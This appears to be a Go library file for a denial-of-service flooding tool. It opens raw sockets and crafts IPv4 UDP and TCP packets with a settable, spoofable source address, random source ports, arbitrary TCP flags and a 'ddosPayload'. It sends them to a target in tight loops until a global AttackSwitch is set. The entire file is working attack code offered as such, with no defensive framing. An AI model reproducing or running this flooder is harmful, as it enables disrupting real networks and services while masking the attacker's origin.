package lib

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

var AttackSwitch bool

func convInt(str string) int {
	conv, _ := strconv.Atoi(fmt.Sprint(str))
	return conv
}

func rawSocket(rawProtocol int) net.PacketConn {
	sock, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, rawProtocol)
	syscall.SetsockoptInt(sock, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	syscall.SetsockoptInt(sock, syscall.IPPROTO_IP, syscall.SO_REUSEADDR, 1)
	conn, _ := net.FilePacketConn(os.NewFile(uintptr(sock), fmt.Sprint(sock)))
	return conn
}

func setupOpt() (gopacket.SerializeBuffer, *gopacket.SerializeOptions) {
	buffer := gopacket.NewSerializeBuffer()
	opts := &gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	return buffer, opts
}

func setupIPv4(srcv4, dstv4 net.IP, protov4 layers.IPProtocol) *layers.IPv4 {
	ipv4 := &layers.IPv4{
		SrcIP:    srcv4,
		DstIP:    dstv4,
		Version:  4,
		TTL:      255,
		Protocol: protov4,
	}
	return ipv4
}

func (a *Attack) setupUDP(udpSrc, udpDst *net.UDPAddr) []byte {
	sBuffer, sOpt := setupOpt()
	udpv4 := setupIPv4(udpSrc.IP.To4(), udpDst.IP.To4(), layers.IPProtocolUDP)
	udpLayers := &layers.UDP{
		SrcPort: layers.UDPPort(udpSrc.Port),
		DstPort: layers.UDPPort(udpDst.Port),
	}
	udpLayers.SetNetworkLayerForChecksum(udpv4)
	gopacket.SerializeLayers(sBuffer, *sOpt, udpv4, udpLayers, gopacket.Payload(a.ddosPayload))
	return sBuffer.Bytes()
}

func (a *Attack) setupTCP(tcpSrc, tcpDst *net.TCPAddr) []byte {
	sBuffer, sOpt := setupOpt()
	tcpv4 := setupIPv4(tcpSrc.IP.To4(), tcpDst.IP.To4(), layers.IPProtocolTCP)
	tcpLayers := &layers.TCP{
		SrcPort: layers.TCPPort(tcpSrc.Port),
		DstPort: layers.TCPPort(tcpDst.Port),
		SYN:     a.synFlag,
		ACK:     a.ackFlag,
		RST:     a.rstFlag,
		PSH:     a.pshFlag,
		FIN:     a.finFlag,
		URG:     a.urgFlag,
	}
	tcpLayers.SetNetworkLayerForChecksum(tcpv4)
	gopacket.SerializeLayers(sBuffer, *sOpt, tcpv4, tcpLayers, gopacket.Payload(a.ddosPayload))
	return sBuffer.Bytes()
}

func (a *Attack) udpPacket() {
	dst := &net.UDPAddr{
		IP:   net.ParseIP(a.dstAddr),
		Port: convInt(a.dstPort),
	}
	conn := rawSocket(syscall.IPPROTO_UDP)
	for {
		udp := a.setupUDP(&net.UDPAddr{IP: net.ParseIP(a.srcAddr), Port: rand.Intn(65535)}, dst)
		conn.WriteTo(udp, &net.IPAddr{IP: dst.IP})
		if AttackSwitch {
			break
		}
	}
}

func (a *Attack) tcpPacket() {
	dst := &net.TCPAddr{
		IP:   net.ParseIP(a.dstAddr),
		Port: convInt(a.dstPort),
	}
	conn := rawSocket(syscall.IPPROTO_TCP)
	for {
		tcp := a.setupTCP(&net.TCPAddr{IP: net.ParseIP(a.srcAddr), Port: rand.Intn(65535)}, dst)
		conn.WriteTo(tcp, &net.IPAddr{IP: dst.IP})
		if AttackSwitch {
			break
		}
	}
}
